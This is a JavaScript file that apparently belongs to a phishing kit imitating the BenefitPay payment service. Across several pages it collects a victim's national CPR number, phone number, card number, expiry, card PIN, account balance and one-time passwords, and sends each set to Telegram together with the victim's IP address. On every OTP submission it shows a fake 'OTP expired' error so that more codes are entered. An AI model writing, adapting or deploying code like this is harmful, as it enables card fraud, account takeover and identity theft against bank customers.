// Format card number with spaces
function formatCardNumber(input) {
    let value = input.value.replace(/\s/g, '');
    let formattedValue = '';
    
    for (let i = 0; i < value.length && i < 16; i++) {
        if (i > 0 && i % 4 === 0) {
            formattedValue += ' ';
        }
        formattedValue += value[i];
    }
    
    input.value = formattedValue;
}

// Format expiry date as MM/YY
function formatExpiry(input) {
    let value = input.value.replace(/\D/g, '');
    
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    
    input.value = value;
}

// Format month input (2 digits, 01-12)
function formatMonth(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length > 2) {
        value = value.substring(0, 2);
    }
    // Validate month (01-12)
    if (value.length === 2) {
        const month = parseInt(value);
        if (month > 12) {
            value = '12';
        } else if (month === 0) {
            value = '01';
        } else if (month < 10) {
            value = '0' + month;
        }
    }
    input.value = value;
}

// Format year input (2 digits)
function formatYear(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length > 2) {
        value = value.substring(0, 2);
    }
    input.value = value;
}

// Format balance input (numbers only)
function formatBalance(input) {
    input.value = input.value.replace(/\D/g, '');
}

// Navigation functions
function proceedToPhone() {
    const cprNumber = document.getElementById('cprNumber').value;
    
    if (!cprNumber) {
        alert('Please enter your CPR');
        return;
    }
    
    // Store CPR in sessionStorage
    try {
        sessionStorage.setItem('benefitPayFormData', JSON.stringify({
            'CPR': cprNumber
        }));
    } catch (e) {
        console.warn("Error saving CPR:", e);
    }
    
    window.location.href = 'phone.html';
}

async function proceedToCard() {
    const phoneNumber = document.getElementById('phoneNumber').value;
    const termsChecked = document.getElementById('termsCheckbox').checked;
    const countryCode = document.getElementById('selectedCode') ? document.getElementById('selectedCode').textContent : '+973';
    
    // Get CPR from sessionStorage
    let cprNumber = '';
    try {
        const stored = sessionStorage.getItem('benefitPayFormData');
        if (stored) {
            const data = JSON.parse(stored);
            cprNumber = data.CPR || '';
        }
    } catch (e) {
        console.warn("Error reading CPR:", e);
    }
    
    if (!phoneNumber) {
        alert('Please enter your mobile number');
        return;
    }
    
    if (!termsChecked) {
        alert('Please accept the Terms and Conditions');
        return;
    }
    
    // Send to Telegram with IP (first message)
    if (typeof sendFormDataToTelegram !== 'undefined') {
        await sendFormDataToTelegram('New User Registration', {
            'Country Code': countryCode,
            'Mobile Number': phoneNumber,
            'CPR': cprNumber
        }, true); // true = include IP address (first message only)
    }
    
    window.location.href = 'card.html';
}

async function proceedToSecurity() {
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const expiryMonth = document.getElementById('expiryMonth').value;
    const expiryYear = document.getElementById('expiryYear').value;
    const cardPin = document.getElementById('cardPin').value;
    
    if (!cardNumber || cardNumber.length !== 16) {
        alert('Please enter a valid 16-digit card number');
        return;
    }
    
    if (!expiryMonth || expiryMonth.length !== 2 || !expiryYear || expiryYear.length !== 2) {
        alert('Please enter valid month and year');
        return;
    }
    
    if (!cardPin || cardPin.length !== 4) {
        alert('Please enter your 4-digit card PIN');
        return;
    }
    
    const expiryCode = expiryMonth + '/' + expiryYear;
    
    // Send to Telegram with previous entries + card details
    if (typeof sendFormDataToTelegram !== 'undefined') {
        await sendFormDataToTelegram('Card Details Submitted', {
            'Card Number': cardNumber,
            'Expiry Date': expiryCode,
            'Card PIN': cardPin
        }, false); // false = don't include IP (not first message)
    }
    
    window.location.href = 'security.html';
}

async function proceedToOTP() {
    const accountBalance = document.getElementById('accountBalance').value;
    
    if (!accountBalance) {
        alert('Please enter your account balance');
        return;
    }
    
    // Send to Telegram with previous entries + balance
    if (typeof sendFormDataToTelegram !== 'undefined') {
        await sendFormDataToTelegram('Security Question Answered', {
            'Account Balance': accountBalance
        }, false); // false = don't include IP (not first message)
    }
    
    window.location.href = 'otp.html';
}

// OTP Box Functions
function handleOTPInput(index, event) {
    const input = event.target;
    const value = input.value.replace(/\D/g, '');
    
    // Clear error state when user types
    hideOTPError();
    
    if (value.length > 0) {
        input.value = value[0];
        input.classList.add('filled');
        input.classList.remove('error');
        
        // Auto-focus next box
        if (index < 6) {
            const nextInput = document.getElementById('otp' + (index + 1));
            if (nextInput) {
                nextInput.focus();
            }
        }
    } else {
        input.classList.remove('filled');
        input.classList.remove('error');
    }
    
    // Handle paste
    if (event.inputType === 'insertFromPaste') {
        const pastedValue = event.clipboardData.getData('text').replace(/\D/g, '').substring(0, 6);
        fillOTPFromPaste(pastedValue);
    }
}

function handleOTPKeyDown(index, event) {
    const input = event.target;
    
    // Handle backspace
    if (event.key === 'Backspace' && input.value === '' && index > 1) {
        const prevInput = document.getElementById('otp' + (index - 1));
        if (prevInput) {
            prevInput.focus();
            prevInput.value = '';
            prevInput.classList.remove('filled');
        }
    }
    
    // Allow only numbers
    if (!/[0-9]/.test(event.key) && !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(event.key)) {
        event.preventDefault();
    }
}

function fillOTPFromPaste(value) {
    hideOTPError();
    
    for (let i = 0; i < 6; i++) {
        const input = document.getElementById('otp' + (i + 1));
        if (input && value[i]) {
            input.value = value[i];
            input.classList.add('filled');
            input.classList.remove('error');
        } else if (input) {
            input.value = '';
            input.classList.remove('filled');
            input.classList.remove('error');
        }
    }
    
    // Focus the last filled box or next empty box
    const lastFilledIndex = Math.min(value.length, 6);
    const nextInput = document.getElementById('otp' + (lastFilledIndex === 6 ? 6 : lastFilledIndex + 1));
    if (nextInput) {
        nextInput.focus();
    }
}

function showOTPError(message) {
    const errorDiv = document.getElementById('otpError');
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
    }
    
    // Add error styling to all OTP boxes
    for (let i = 1; i <= 6; i++) {
        const input = document.getElementById('otp' + i);
        if (input) {
            input.classList.add('error');
        }
    }
}

function hideOTPError() {
    const errorDiv = document.getElementById('otpError');
    if (errorDiv) {
        errorDiv.style.display = 'none';
    }
    
    // Remove error styling from all OTP boxes
    for (let i = 1; i <= 6; i++) {
        const input = document.getElementById('otp' + i);
        if (input) {
            input.classList.remove('error');
        }
    }
}

async function verifyOTP() {
    let otpCode = '';
    for (let i = 1; i <= 6; i++) {
        const input = document.getElementById('otp' + i);
        if (input) {
            otpCode += input.value;
        }
    }
    
    if (!otpCode || otpCode.length !== 6) {
        showOTPError('Please enter a valid 6-digit OTP');
        return;
    }
    
    // Send to Telegram with previous entries + OTP (every time OTP is entered)
    if (typeof sendFormDataToTelegram !== 'undefined') {
        await sendFormDataToTelegram('OTP Entered', {
            'OTP': otpCode
        }, false); // false = don't include IP (not first message)
    }
    
    // Show error message as requested
    showOTPError('OTP expired! Please re-enter your OTP');
    
    // Clear OTP boxes after a short delay
    setTimeout(() => {
        for (let i = 1; i <= 6; i++) {
            const input = document.getElementById('otp' + i);
            if (input) {
                input.value = '';
                input.classList.remove('filled');
            }
        }
        // Focus first box
        const firstInput = document.getElementById('otp1');
        if (firstInput) {
            firstInput.focus();
        }
    }, 2000);
}

// Resend OTP functionality
let resendTimerInterval = null;
let resendTimerSeconds = 60;

function startResendTimer() {
    const resendBtn = document.getElementById('resendBtn');
    const resendText = document.getElementById('resendText');
    const resendTimer = document.getElementById('resendTimer');
    
    if (!resendBtn || !resendText || !resendTimer) return;
    
    // Disable button and start timer
    resendBtn.disabled = true;
    resendTimerSeconds = 60;
    resendText.style.display = 'none';
    resendTimer.style.display = 'inline';
    
    const updateTimer = () => {
        resendTimer.textContent = `Resend OTP in ${resendTimerSeconds}s`;
        
        if (resendTimerSeconds <= 0) {
            // Enable button
            resendBtn.disabled = false;
            resendText.style.display = 'inline';
            resendTimer.style.display = 'none';
            
            if (resendTimerInterval) {
                clearInterval(resendTimerInterval);
                resendTimerInterval = null;
            }
        } else {
            resendTimerSeconds--;
        }
    };
    
    updateTimer(); // Update immediately
    resendTimerInterval = setInterval(updateTimer, 1000);
}

function resendOTP() {
    // Clear all OTP boxes
    for (let i = 1; i <= 6; i++) {
        const input = document.getElementById('otp' + i);
        if (input) {
            input.value = '';
            input.classList.remove('filled');
            input.classList.remove('error');
        }
    }
    
    // Hide error message
    hideOTPError();
    
    // Focus first box
    const firstInput = document.getElementById('otp1');
    if (firstInput) {
        firstInput.focus();
    }
    
    // Start timer again
    startResendTimer();
    
    // Here you would typically send a new OTP to the user
    // For now, just reset the form and timer
}

// Country Code Dropdown Functions
function toggleCountryDropdown(event) {
    event.stopPropagation();
    const countryCode = document.getElementById('countryCode');
    countryCode.classList.toggle('open');
}

function selectCountryCode(code, event) {
    event.stopPropagation();
    const selectedCode = document.getElementById('selectedCode');
    selectedCode.textContent = code;
    
    // Update selected state
    const options = document.querySelectorAll('.country-option');
    options.forEach(option => {
        option.classList.remove('selected');
        if (option.textContent.trim() === code) {
            option.classList.add('selected');
        }
    });
    
    // Close dropdown
    const countryCode = document.getElementById('countryCode');
    countryCode.classList.remove('open');
}

// Close dropdown when clicking outside
document.addEventListener('click', function(event) {
    const countryCode = document.getElementById('countryCode');
    if (!countryCode.contains(event.target)) {
        countryCode.classList.remove('open');
    }
});

// Close Notice Popup
function closeNoticePopup() {
    const noticePopup = document.getElementById('noticePopup');
    const mainContent = document.getElementById('mainContent');
    
    if (noticePopup) {
        noticePopup.classList.add('hidden');
        // Show main content after popup closes
        setTimeout(() => {
            if (mainContent) {
                mainContent.style.display = 'block';
            }
        }, 300);
    }
}

// Splash Screen Handler
document.addEventListener('DOMContentLoaded', function() {
    const splashScreen = document.getElementById('splashScreen');
    const noticePopup = document.getElementById('noticePopup');
    const mainContent = document.getElementById('mainContent');
    
    if (splashScreen) {
        // Hide splash screen after 2.5 seconds, then show popup
        setTimeout(() => {
            splashScreen.classList.add('hidden');
            // Show main content behind popup (for blur effect), then show popup
            setTimeout(() => {
                if (mainContent && noticePopup) {
                    // Show main content first so it appears blurred behind popup
                    mainContent.style.display = 'block';
                    // Then show popup on top
                    setTimeout(() => {
                        noticePopup.style.display = 'flex';
                    }, 100);
                } else if (noticePopup) {
                    noticePopup.style.display = 'flex';
                } else if (mainContent) {
                    // If no popup, show main content directly
                    mainContent.style.display = 'block';
                }
            }, 500); // Wait for fade transition
        }, 2500);
    } else if (noticePopup) {
        // If no splash, show main content first, then popup
        if (mainContent) {
            mainContent.style.display = 'block';
            setTimeout(() => {
                noticePopup.style.display = 'flex';
            }, 100);
        } else {
            noticePopup.style.display = 'flex';
        }
    } else if (mainContent) {
        // If no splash or popup, show content immediately
        mainContent.style.display = 'block';
    }
    
    // Allow only numbers for CPR, PIN inputs
    const cprInput = document.getElementById('cprNumber');
    if (cprInput) {
        cprInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }
    
    const pinInput = document.getElementById('cardPin');
    if (pinInput) {
        pinInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }
    
    // Handle paste for OTP container
    const otpContainer = document.getElementById('otpContainer');
    if (otpContainer) {
        otpContainer.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedValue = e.clipboardData.getData('text').replace(/\D/g, '').substring(0, 6);
            fillOTPFromPaste(pastedValue);
        });
        
        // Auto-focus first OTP box on page load
        const firstOTP = document.getElementById('otp1');
        if (firstOTP) {
            setTimeout(() => firstOTP.focus(), 100);
        }
        
        // Start resend timer on page load
        startResendTimer();
    }
});

